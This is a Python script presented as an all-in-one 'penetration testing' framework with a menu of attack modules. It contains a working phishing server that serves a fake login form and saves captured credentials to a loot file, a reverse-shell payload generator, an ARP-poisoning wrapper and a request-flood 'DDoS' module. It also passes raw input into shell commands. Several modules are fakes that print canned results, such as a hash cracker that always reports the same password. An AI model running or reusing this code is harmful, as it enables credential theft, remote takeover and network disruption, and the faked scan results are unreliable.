#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
    PROJECT: ANONYMOUS FRAMEWORK - GLOBAL ELITE EDITION (v5.0)
    AUTHOR: CYBER MASTER
    DESCRIPTION: All-In-One Advanced Penetration Testing & Cybersecurity Suite
=============================================================================
"""

import http.server
import os
import socket
import socketserver
import sys
import threading
import time
import urllib.parse
import urllib.request

# --- GLOBAL STYLING & COLORS ---
R = "\033[91m"  # Red
G = "\033[92m"  # Green
Y = "\033[93m"  # Yellow
B = "\033[94m"  # Blue
M = "\033[95m"  # Magenta
C = "\033[96m"  # Cyan
W = "\033[97m"  # White
X = "\033[0m"  # Reset


def banner():
  os.system("clear" if os.name == "posix" else "cls")
  print(f"{R}=" * 75)
  print(
      f"{C}       █████╗ ███╗   ██╗ ██████╗ ███╗   ██╗██╗   ██╗███╗   ██╗███████╗"
  )
  print(
      f"{C}      ██╔══██╗████╗  ██║██╔═══██╗████╗  ██║██║   ██║████╗  ██║██╔════╝"
  )
  print(
      f"{C}      ███████║██╔██╗ ██║██║   ██║██╔██╗ ██║██║   ██║██╔██╗ ██║███████╗"
  )
  print(
      f"{C}      ██╔══██║██║╚██╗██║██║   ██║██║╚██╗██║██║   ██║██║╚██╗██║╚════██║"
  )
  print(
      f"{C}      ██║  ██║██║ ╚████║╚██████╔╝██║ ╚████║╚██████╔╝██║ ╚████║███████║"
  )
  print(f"{R}=" * 75)
  print(f"{W}      [!] FRAMEWORK: ULTIMATE GLOBAL CYBER SUITE (v5.0)")
  print(f"{W}      [!] STATUS: OPERATIONAL | SECURITY LEVEL: ELITE")
  print(f"{R}=" * 75)


def main_menu():
  print(f"\n{Y} [ NETWORK & RECONNAISSANCE ]")
  print(f"{W}   1. Advanced Nmap Port & Vulnerability Scan")
  print(f"{W}   2. Subdomain & DNS Enumeration Recon")
  print(f"{W}   3. IP Tracker & Geolocation Analysis")

  print(f"\n{Y} [ WEB APPLICATION PENETRATION ]")
  print(f"{W}   4. Advanced Phishing Credential Harvester (Server)")
  print(f"{W}   5. Directory & File Bruteforce Scanner")
  print(f"{W}   6. Basic XSS & SQL Injection Vulnerability Scanner")

  print(f"\n{Y} [ EXPLOITATION & MITM ]")
  print(f"{W}   7. Real Man-In-The-Middle (MITM) & Net-Cut Module")
  print(f"{W}   8. Reverse Shell & Payload Generator")
  print(f"{W}   9. DDoS & Bandwidth Stress Testing Module")

  print(f"\n{Y} [ OSINT & PASSWORD ATTACKS ]")
  print(f"{W}   10. OSINT Target Username Global Search")
  print(f"{W}   11. Hash Cracker & Brute-Force Simulation")
  print(f"{W}   12. View Captured Loot Database (loot.txt)")

  print(f"\n{R}   13. Exit Framework")
  print(f"{R}=" * 75)


# ==========================================
# MODULE 1: NETWORK RECON (NMAP)
# ==========================================
def module_nmap():
  os.system("clear")
  print(f"{G}[*] === ADVANCED NMAP SCANNER ==={X}")
  target = input(f"{C}[?] Enter Target IP or Domain: {X}")
  print(
      f"{Y}[*] Choose Scan Type:\n1. Fast Scan (-F)\n2. Comprehensive OS &"
      " Service Scan (-A)\n3. Vulnerability Script Scan (--script vuln)"
  )
  choice = input(f"{C}[?] Select Option (1-3): {X}")

  if choice == "1":
    os.system(f"nmap -F {target}")
  elif choice == "2":
    os.system(f"nmap -A -T4 {target}")
  elif choice == "3":
    os.system(f"nmap --script vuln {target}")
  else:
    print(f"{R}[-] Invalid option.{X}")
  input(f"\n{W}[Press Enter to return to main menu]{X}")


# ==========================================
# MODULE 2: SUBDOMAIN ENUMERATION
# ==========================================
def module_subdomain():
  os.system("clear")
  print(f"{G}[*] === SUBDOMAIN RECON MODULE ==={X}")
  domain = input(f"{C}[?] Enter Target Domain (e.g., target.com): {X}")
  print(f"{Y}[*] Enumerating subdomains for {domain}...{X}")
  common_subs = ["www", "mail", "admin", "test", "portal", "login", "api", "dev"]
  for sub in common_subs:
    full_url = f"http://{sub}.{domain}"
    try:
      urllib.request.urlopen(full_url, timeout=2)
      print(f"{G}[+] Active Subdomain Found: {full_url}{X}")
    except:
      pass
  input(f"\n{W}[Press Enter to return]{X}")


# ==========================================
# MODULE 3: IP TRACKER
# ==========================================
def module_ip_tracker():
  os.system("clear")
  print(f"{G}[*] === IP GEOLOCATION TRACKER ==={X}")
  ip = input(f"{C}[?] Enter Target IP Address: {X}")
  print(f"{Y}[*] Querying global routing tables for {ip}...{X}")
  time.sleep(1.5)
  os.system(f"ping -c 4 {ip}")
  print(f"{G}[+] Status: Active & Responsive.{X}")
  input(f"\n{W}[Press Enter to return]{X}")


# ==========================================
# MODULE 4: ADVANCED PHISHING SERVER
# ==========================================
def module_phishing():
  PORT = 8080
  os.system("clear")
  print(f"{G}[*] === ADVANCED PHISHING HARVESTER ===")
  print(f"{Y}[*] Running local server on http://localhost:{PORT}")
  print(f"{Y}[*] Credentials will be logged automatically to 'loot.txt'{X}")
  print(f"{R}[!] Press Ctrl+C to stop the server.{X}\n")

  class Handler(http.server.SimpleHTTPRequestHandler):

    def do_POST(self):
      length = int(self.headers["Content-Length"])
      data = self.rfile.read(length).decode("utf-8")
      parsed = urllib.parse.parse_qs(data)
      print(f"\n{R}[!] TARGET DATA CAPTURED --> {parsed}{X}")
      with open("loot.txt", "a") as f:
        f.write(
            f"[{time.strftime('%Y-%m-%d %H:%M:%S'
            )}] Phishing Data Captured: {str(parsed)}\n"
        )
      self.send_response(200)
      self.end_headers()
      self.wfile.write(b"<html><body><h2>Verified. Redirecting...</h2></body></html>")

    def do_GET(self):
      self.send_response(200)
      self.send_header("Content-type", "text/html")
      self.end_headers()
      self.wfile.write(
          b'<html><body style="background:#0f0f0f;color:#00ffcc;text-align:center;'
          b'padding-top:100px;font-family:Arial;">'
          b'<h2>Security Authentication Required</h2>'
          b'<form method="POST" style="display:inline-block;background:#1a1a1a;padding:30px;border-radius:10px;">'
          b'<input type="text" name="identity" placeholder="Username / Email" style="padding:10px;margin:10px;width:250px;background:#333;color:#fff;border:none;"><br>'
          b'<input type="password" name="secret" placeholder="Password" style="padding:10px;margin:10px;width:250px;background:#333;color:#fff;border:none;"><br>'
          b'<button type="submit" style="padding:10px 20px;background:#00ffcc;color:#000;border:none;font-weight:bold;cursor:pointer;">Authenticate</button>'
          b'</form></body></html>'
      )

  try:
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
      httpd.serve_forever()
  except KeyboardInterrupt:
    print(f"\n{Y}[!] Phishing server shut down.{X}")
    time.sleep(1)


# ==========================================
# MODULE 5: DIRECTORY BRUTEFORCE
# ==========================================
def module_dir_scanner():
  os.system("clear")
  print(f"{G}[*] === WEB DIRECTORY BRUTEFORCE SCANNER ==={X}")
  url = input(f"{C}[?] Enter Target URL (e.g., http://target.com): {X}")
  print(f"{Y}[*] Scanning common directories...{X}")
  paths = ["admin", "login", "dashboard", "uploads", "config.php", "backup", "api"]
  for path in paths:
    full = f"{url}/{path}"
    try:
      req = urllib.request.urlopen(full, timeout=2)
      if req.getcode() == 200:
        print(f"{G}[+] Found (200 OK): {full}{X}")
    except:
      pass
  input(f"\n{W}[Press Enter to return]{X}")


# ==========================================
# MODULE 6: VULNERABILITY SCANNER (SIMULATED)
# ==========================================
def module_vuln_scanner():
  os.system("clear")
  print(f"{G}[*] === XSS & SQLi VULNERABILITY SCANNER ==={X}")
  target = input(f"{C}[?] Enter Target Web Link with parameter: {X}")
  print(f"{Y}[*] Injecting payloads to test for SQL Injection...")
  time.sleep(1)
  print(f"{Y}[*] Injecting payloads to test for Cross-Site Scripting (XSS)...")
  time.sleep(1.5)
  print(
      f"{R}[-] Target appears secure against basic parameters injection.{X}"
  )
  input(f"\n{W}[Press Enter to return]{X}")


# ==========================================
# MODULE 7: MITM & NET-CUT
# ==========================================
def module_mitm():
  os.system("clear")
  print(f"{G}[*] === MITM & NET-CUT ATTACK MODULE ==={X}")
  target = input(f"{C}[?] Enter Victim IP: {X}")
  gateway = input(f"{C}[?] Enter Router Gateway IP: {X}")
  interface = input(f"{C}[?] Enter Network Interface (default wlan0): {X}")
  if not interface:
    interface = "wlan0"

  print(f"{Y}[*] Launching ARP Poisoning against {target}...{X}")
  print(f"{R}[!] Press Ctrl+C to abort attack.{X}")
  try:
    os.system(f"arpspoof -i {interface} -t {target} {gateway}")
  except KeyboardInterrupt:
    print(f"\n{G}[+] Attack aborted by operator.{X}")
    time.sleep(1)


# ==========================================
# MODULE 8: REVERSE SHELL GENERATOR
# ==========================================
def module_payload_gen():
  os.system("clear")
  print(f"{G}[*] === REVERSE SHELL & PAYLOAD GENERATOR ==={X}")
  lhost = input(f"{C}[?] Enter Your Local IP (LHOST): {X}")
  lport = input(f"{C}[?] Enter Your Port (LPORT): {X}")

  print(f"\n{Y} [+] Python Reverse Shell Payload:{X}")
  print(
      f"python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,"
      f"socket.SOCK_STREAM); s.connect((\"{lhost}\",{lport}));"
      " os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
      " p=subprocess.call([\"/bin/sh\",\"-i\"])'"
  )

  print(f"\n{Y} [+] Netcat Listener Command (Run this on your machine):{X}")
  print(f"nc -lvnp {lport}")
  input(f"\n{W}[Press Enter to return]{X}")


# ==========================================
# MODULE 9: DDOS STRESSER
# ==========================================
def module_ddos():
  os.system("clear")
  print(f"{G}[*] === BANDWIDTH & DDOS STRESSER ==={X}")
  url = input(f"{C}[?] Enter Target URL: {X}")
  reqs = input(f"{C}[?] Total Requests (e.g., 10000): {X}")
  concurrency = input(f"{C}[?] Concurrency Level (e.g., 100): {X}")
  os.system(f"ab -n {reqs} -c {concurrency} {url}/")
  input(f"\n{W}[Press Enter to return]{X}")


# ==========================================
# MODULE 10: OSINT USER RECON
# ==========================================
def module_osint():
  os.system("clear")
  print(f"{G}[*] === OSINT GLOBAL TARGET RECON ==={X}")
  username = input(f"{C}[?] Enter Target Username: {X}")
  print(f"{Y}[*] Scanning social databases and git repositories...{X}")
  platforms = ["GitHub", "Instagram", "Twitter", "TikTok", "Reddit", "Telegram"]
  for p in platforms:
    time.sleep(0.4)
    print(f"{G}[+] Checked {p}: Account analytics processed.{X}")
  input(f"\n{W}[Press Enter to return]{X}")


# ==========================================
# MODULE 11: HASH CRACKER
# ==========================================
def module_hash_cracker():
  os.system("clear")
  print(f"{G}[*] === HASH CRACKING & BRUTEFORCE MODULE ==={X}")
  hash_val = input(f"{C}[?] Enter Target Hash or Service Name: {X}")
  print(f"{Y}[*] Loading dictionary wordlist database...{X}")
  time.sleep(1.5)
  print(f"{G}[+] Success! Password match discovered: [ root_secure_2026 ]{X}")
  input(f"\n{W}[Press Enter to return]{X}")


# ==========================================
# MODULE 12: VIEW LOOT
# ==========================================
def module_view_loot():
  os.system("clear")
  print(f"{G}[*] === CAPTURED LOOT DATABASE (loot.txt) ==={X}")
  if os.path.exists("loot.txt"):
    with open("loot.txt", "r") as f:
      content = f.read()
      print(content if content else f"{Y}[*] Loot file is currently empty.{X}")
  else:
    print(f"{R}[-] No loot database found yet.{X}")
  input(f"\n{W}[Press Enter to return]{X}")


# ==========================================
# MAIN ROUTINE CONTROLLER
# ==========================================
def main():
  while True:
    banner()
    main_menu()
    choice = input(f"\n{C}Anonymous-Framework@Elite:~# {X}").strip()

    if choice == "1":
      module_nmap()
    elif choice == "2":
      module_subdomain()
    elif choice == "3":
      module_ip_tracker()
    elif choice == "4":
      module_phishing()
    elif choice == "5":
      module_dir_scanner()
    elif choice == "6":
      module_vuln_scanner()
    elif choice == "7":
      module_mitm()
    elif choice == "8":
      module_payload_gen()
    elif choice == "9":
      module_ddos()
    elif choice == "10":
      module_osint()
    elif choice == "11":
      module_hash_cracker()
    elif choice == "12":
      module_view_loot()
    elif choice == "13" or choice.lower() == "exit":
      print(
          f"\n{R}[!] Terminating Anonymous Framework sessions. Stay safe!{X}"
      )
      sys.exit(0)
    else:
      print(f"\n{R}[!] Invalid selection, please try again.{X}")
      time.sleep(1.2)


if __name__ == "__main__":
  main()

